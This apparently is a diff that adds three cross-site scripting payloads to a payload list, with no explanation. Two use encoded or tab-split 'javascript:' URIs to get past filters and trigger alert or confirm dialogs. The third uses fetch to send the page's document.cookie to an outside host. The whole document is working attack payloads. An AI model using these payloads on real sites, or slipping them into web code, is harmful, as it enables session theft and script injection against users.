@@ -1,0 +1,3 @@
+- location.href = /javascript:%27\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e%27/.source;
+- window.location = decodeURIComponent\`%00Jav%09asc%09ript:https://domain.com/%250Aconfirm%25281%2529)`
+- fetch(/\blue.exeye.io/+document.cookie)
